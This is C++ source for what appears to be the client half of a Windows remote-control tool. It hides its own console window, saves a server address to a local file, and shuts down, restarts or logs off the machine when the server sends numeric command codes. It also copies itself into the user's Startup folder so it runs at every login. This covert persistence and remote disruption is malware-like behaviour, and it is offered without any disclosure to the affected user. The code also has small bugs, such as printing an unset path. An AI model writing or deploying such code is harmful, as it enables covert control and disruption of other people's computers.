#include <winsock2.h>
#include <thread>
#include <windows.h>
#include <fstream>
#include <vector>

void Hide() {
    AllocConsole();
    HWND win = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(win, 0);
}

int saveServerInfo(std::string ip, int port) {
    char currentPath[MAX_PATH];
    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "[!] Failed to get the executable path." << std::endl;
        return -1;
    }

    std::string string_path = std::string(currentPath); 
    size_t file_name_pos = string_path.find_last_of("\\");    
    std::string file_name = string_path.substr(file_name_pos+1, MAX_PATH);
    std::string path_only = string_path.substr(0, file_name_pos);

    std::cout << "[+] Save path: " << path_only << "\\server.info \n"; 

    std::ofstream file(path_only + "\\server.info");
    file << ip << "\n" << port << "\n";
    file.close();

    return 0; 
}


std::vector<std::string> readServerInfo() {
    char currentPath[MAX_PATH];
    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "[!] Failed to get the executable path." << std::endl;
        return {};
    }

    std::string string_path = std::string(currentPath); 
    size_t file_name_pos = string_path.find_last_of("\\");    
    std::string path_only = string_path.substr(0, file_name_pos);

    std::cout << "[=] Checking: " << path_only << "\\server.info\n";

    std::ifstream file(path_only+"\\server.info");
    if (!file.good()) {
        std::cout << "[!] No saved server credentials\n";
        file.close();
        return {};
    }

    std::string line;
    std::vector<std::string> temp;
    while (std::getline(file, line)) {
        temp.push_back(line);
    } file.close();

    return temp;
}


void HandleCommands(std::string command, SOCKET sock) {
	if (command == "229892") {
		std::cout << "[!] Server sent a shutdown signal.\n"; // shutdown
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
        closesocket(sock);      // close before signing out
		system("shutdown /s /t 5");
	} else if (command == "893234") {
		std::cout << "[!] Server sent a restart signal.\n"; // restart
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
        closesocket(sock);      // close before signing out
		system("shutdown /r");	
	} else if (command == "837453") {
		std::cout << "[!] Server sent a lock signal.\n"; // lock
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
        closesocket(sock);      // close before signing out
		ExitWindowsEx(0, 0);
	} 

    // else {
    //     std::cout << "[!] Server sent this unknown command: " << command << "\n";
    // }
}

void SaveOnStartUp() {
    std::cout << "[=] Saving on start up. Please wait...\n";

    char currentPath[MAX_PATH];
    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "[!] Failed to get the executable path." << std::endl;
        return;
    }

    std::cout << "[+] Current exe path: " << currentPath << '\n';

    char destinationPath[MAX_PATH];
    const char* appDataDir = getenv("APPDATA"); // Get the AppData directory
    if (appDataDir == NULL) {
        std::cerr << "[!] Failed to get AppData directory." << std::endl;
        return;
    }

    std::cout << "[+] Program will be saved here: " << destinationPath << '\n';

    snprintf(destinationPath, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe", appDataDir);

    if (CopyFile(currentPath, destinationPath, FALSE) == 0) {
        std::cerr << "[!] Failed to copy the file. Error: " << GetLastError() << std::endl;
        return;
    }

    std::cout << "[+] Executable saved to: " << destinationPath << "\n\n";
    return ;
}